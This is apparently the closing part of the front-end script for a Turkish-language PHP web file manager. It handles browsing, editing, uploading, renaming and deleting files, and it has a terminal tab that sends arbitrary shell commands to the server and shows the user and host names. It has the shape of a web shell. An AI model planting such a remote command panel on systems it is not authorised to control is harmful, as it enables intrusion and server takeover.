  document.querySelectorAll('#file-body tr').forEach(tr=>{
    tr.style.display=(!q||(tr.dataset.name||'').includes(q))?'':'none';
  });
}

async function openEditor(path){
  const r=await fetch(`?action=read&path=${encodeURIComponent(path)}`,{headers:{'X-Requested-With':'XMLHttpRequest'}});
  const d=await r.json();
  if(!d.ok){toast(d.msg,'err');return;}
  editorPath=path;
  document.getElementById('editor-title').textContent=path;
  document.getElementById('editor-textarea').value=d.content;
  document.getElementById('editor-panel').classList.remove('hidden');
}
function closeEditor(){document.getElementById('editor-panel').classList.add('hidden');editorPath=null}
async function saveFile(){
  if(!editorPath) return;
  const r=await fetch('?action=save',{method:'POST',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
    body:JSON.stringify({path:editorPath,content:document.getElementById('editor-textarea').value})});
  const d=await r.json(); toast(d.msg,d.ok?'ok':'err');
}

function confirmDelete(path,name,isDir){
  deleteTarget=[path];
  document.getElementById('del-msg').textContent=`"${name}" ${isDir?'klasörü ve içeriği':'dosyası'} kalıcı silinecek. Emin misiniz?`;
  document.getElementById('btn-del-confirm').onclick=doDelete;
  showModal('modal-delete');
}
function bulkDelete(){
  if(!selectedRows.size) return;
  deleteTarget=[...selectedRows];
  document.getElementById('del-msg').textContent=`${selectedRows.size} öğe kalıcı silinecek.`;
  document.getElementById('btn-del-confirm').onclick=doDelete;
  showModal('modal-delete');
}
async function doDelete(){
  closeModal('modal-delete'); let ok=0,fail=0;
  for(const p of deleteTarget){
    const r=await fetch('?action=delete',{method:'POST',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({path:p})});
    (await r.json()).ok?ok++:fail++;
  }
  toast(fail===0?`${ok} öğe silindi`:`${ok} silindi, ${fail} hata`,fail===0?'ok':'err'); refresh();
}

function startRename(path,current){
  renameTarget=path; const inp=document.getElementById('inp-rename'); inp.value=current;
  showModal('modal-rename'); setTimeout(()=>inp.select(),180);
}
async function doRename(){
  const n=document.getElementById('inp-rename').value.trim(); if(!n) return;
  closeModal('modal-rename');
  const r=await fetch('?action=rename',{method:'POST',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({path:renameTarget,newname:n})});
  const d=await r.json(); toast(d.msg,d.ok?'ok':'err'); if(d.ok) refresh();
}

async function doNewFolder(){
  const n=document.getElementById('inp-folder').value.trim(); if(!n) return;
  closeModal('modal-folder');
  const r=await fetch('?action=newfolder',{method:'POST',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({path:currentPath,name:n})});
  const d=await r.json(); toast(d.msg,d.ok?'ok':'err'); if(d.ok){document.getElementById('inp-folder').value='';refresh();}
}
async function doNewFile(){
  const n=document.getElementById('inp-newfile').value.trim(); if(!n) return;
  closeModal('modal-newfile');
  const r=await fetch('?action=newfile',{method:'POST',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({path:currentPath,name:n})});
  const d=await r.json(); toast(d.msg,d.ok?'ok':'err'); if(d.ok){document.getElementById('inp-newfile').value='';refresh();}
}

function handleDrop(e){e.preventDefault();document.getElementById('drop-zone').classList.remove('drag-over');handleFiles(e.dataTransfer.files);}
function handleFiles(files){
  uploadFiles=[...files];
  document.getElementById('upload-list').innerHTML=uploadFiles.map((f,i)=>
    `<div class="upload-item" id="uitem-${i}"><span>📄 ${f.name}</span><span style="color:var(--muted)">${fmtSz(f.size)}</span><span class="status" id="ustatus-${i}"></span></div>`
  ).join('');
  document.getElementById('btn-upload').disabled=uploadFiles.length===0;
}
function fmtSz(b){if(!b)return'0 B';const u=['B','KB','MB','GB'],i=Math.floor(Math.log(b)/Math.log(1024));return(b/Math.pow(1024,i)).toFixed(1)+' '+u[i];}
async function doUpload(){
  if(!uploadFiles.length) return; document.getElementById('btn-upload').disabled=true;
  for(let i=0;i<uploadFiles.length;i++){
    const fd=new FormData(); fd.append('path',currentPath); fd.append('files[]',uploadFiles[i]);
    document.getElementById(`ustatus-${i}`).textContent='⏳';
    const r=await fetch('?action=upload',{method:'POST',headers:{'X-Requested-With':'XMLHttpRequest'},body:fd});
    const d=await r.json();
    document.getElementById(`ustatus-${i}`).textContent=(d.ok&&d.results?.[0]?.ok)?'✅':'❌';
  }
  toast('Yükleme tamamlandı','ok'); refresh();
}

function toggleRow(chk,path){chk.checked?selectedRows.add(path):selectedRows.delete(path);updateSelBar();}
function toggleAll(chk){selectedRows.clear();document.querySelectorAll('#file-body input[type=checkbox]').forEach(c=>{c.checked=chk.checked;if(chk.checked)selectedRows.add(c.dataset.path);});updateSelBar();}
function clearSelection(){selectedRows.clear();document.querySelectorAll('input[type=checkbox]').forEach(c=>c.checked=false);updateSelBar();}
function updateSelBar(){document.getElementById('sel-count').textContent=`${selectedRows.size} seçili`;document.getElementById('sel-bar').classList.toggle('visible',selectedRows.size>0);}

// ── SHELL ──────────────────────────────────────────────────
const ROOT=<?=json_encode($root_real)?>;
const TO=()=>document.getElementById('terminal-output');

function updatePrompt(){
  let d=shellCwd.replace(ROOT,'~'); if(!d.startsWith('~')) d='~'+d;
  document.getElementById('cwd-display').textContent=shellCwd;
  document.getElementById('prompt-path').textContent=d;
}
function appendLine(html){const e=document.createElement('div');e.innerHTML=html;TO().appendChild(e);TO().scrollTop=TO().scrollHeight;}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>').replace(/ /g,'&nbsp;');}

function appendPrompt(cmd){
  let d=shellCwd.replace(ROOT,'~'); if(!d.startsWith('~')) d='~'+d;
  const w=<?=json_encode($whoami)?>, h=<?=json_encode($hostname)?>;
  appendLine(`<div class="t-line"><span class="t-prompt"><span class="uh">${esc(w)}</span><span class="at">@</span><span class="ho">${esc(h)}</span><span class="co">:</span><span class="pa">${esc(d)}</span><span class="do"> $ </span></span><span class="t-cmd">${esc(cmd)}</span></div>`);
}

async function runShell(){
  const inp=document.getElementById('shell-input');
  const cmd=inp.value.trim(); if(!cmd) return;
  cmdHistory.unshift(cmd); if(cmdHistory.length>50) cmdHistory.pop(); histIdx=-1; inp.value='';
  appendPrompt(cmd);
  const r=await fetch('?action=shell',{method:'POST',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd,cwd:shellCwd})});
  const d=await r.json();
  if(!d.ok){appendLine(`<div class="t-err">${esc(d.msg)}</div>`);return;}
  if(d.cwd){shellCwd=d.cwd;updatePrompt();}
  if(d.output) appendLine(`<div class="${d.code?'t-err':'t-out'}">${esc(d.output)}</div>`);
  if(d.code&&d.code!==0) appendLine(`<div class="t-xer">exit ${d.code}</div>`);
}

function runQuick(cmd){switchTab('shell');document.getElementById('shell-input').value=cmd;runShell();}
function clearTerminal(){TO().innerHTML='';}
function copyOutput(){navigator.clipboard.writeText(TO().innerText).then(()=>toast('Kopyalandı','ok'));}

document.addEventListener('keydown',e=>{
  const inp=document.getElementById('shell-input');
  const shellActive=document.getElementById('pane-shell')?.classList.contains('active');
  if(shellActive&&document.activeElement===inp){
    if(e.key==='Enter'){runShell();}
    else if(e.key==='ArrowUp'){e.preventDefault();if(histIdx<cmdHistory.length-1){histIdx++;inp.value=cmdHistory[histIdx];}}
    else if(e.key==='ArrowDown'){e.preventDefault();if(histIdx>0){histIdx--;inp.value=cmdHistory[histIdx];}else{histIdx=-1;inp.value='';}}
    else if(e.ctrlKey&&e.key==='l'){e.preventDefault();clearTerminal();}
    else if(e.ctrlKey&&e.key==='c'&&!window.getSelection().toString()){e.preventDefault();appendLine(`<span style="color:var(--muted)">^C</span>`);inp.value='';}
  }
  if(e.key==='Escape') document.querySelectorAll('.overlay.show').forEach(o=>o.classList.remove('show'));
  if((e.ctrlKey||e.metaKey)&&e.key==='s'&&editorPath){e.preventDefault();saveFile();}
});

function showModal(id){document.getElementById(id).classList.add('show');}
function closeModal(idOrEl){const e=typeof idOrEl==='string'?document.getElementById(idOrEl):idOrEl;if(e?.classList.contains('overlay'))e.classList.remove('show');}
let toastTimer;
function toast(msg,type='ok'){const e=document.getElementById('toast');e.textContent=(type==='ok'?'✓ ':'✗ ')+msg;e.className='show '+type;clearTimeout(toastTimer);toastTimer=setTimeout(()=>e.className='',3000);}

// ── INIT ───────────────────────────────────────────────────
navigate('');
updatePrompt();
appendLine(`<div style="color:var(--muted);line-height:1.9;padding:2px 0"><span style="color:var(--success)">✓</span> Terminal hazır &nbsp;—&nbsp; <span style="color:var(--accent)"><?=htmlspecialchars($whoami)?>@<?=htmlspecialchars($hostname)?></span><br><span style="font-size:11px">↑↓ geçmiş &nbsp;·&nbsp; Ctrl+L temizle &nbsp;·&nbsp; Ctrl+C iptal &nbsp;·&nbsp; Kök: ${ROOT}</span></div>`);
</script>
</body>
</html>